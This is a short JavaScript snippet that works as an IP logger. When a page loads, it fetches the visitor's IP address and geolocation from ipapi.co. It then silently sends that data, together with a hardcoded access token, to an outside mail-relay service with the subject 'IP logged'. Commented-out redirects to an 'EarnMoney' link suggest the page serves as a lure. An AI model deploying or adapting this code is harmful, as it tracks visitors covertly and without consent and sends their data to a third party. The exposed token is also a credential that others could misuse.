var data = {
  access_token: 'zlp84wtqc5op1n9bnfqe7gf5',
};

jQuery.getCORS = function (source, func) {
  var xmlHttpRequestObject;
  if (window.XMLHttpRequest) {
    xmlHttpRequestObject = new XMLHttpRequest();
    if (xmlHttpRequestObject != null) {
      var sUrl = source;
      xmlHttpRequestObject.open('GET', sUrl, true);
      xmlHttpRequestObject.onreadystatechange = function () {
        func(xmlHttpRequestObject.responseText);
      };
      xmlHttpRequestObject.send();
    } else {
      func('Error creating XmlHttpRequest object. Client is not CORS enabled');
    }
  }
};

$(document).ready(function () {
  $.getCORS('https://ipapi.co/json/', function (ip) {
    data['subject'] = 'IP logged';
    data['text'] = ip;

    $.post('https://postmail.invotes.com/send', data, function () {
      //success
      alert('Sent mail, ip logged:' + ip);
      //window.location = 'https://letmegooglethat.com/?q=EarnMoney';
    }).fail(function () {
      //error
      alert('error');
      //window.location = 'https://letmegooglethat.com/?q=EarnMoney';
    });
  });
});
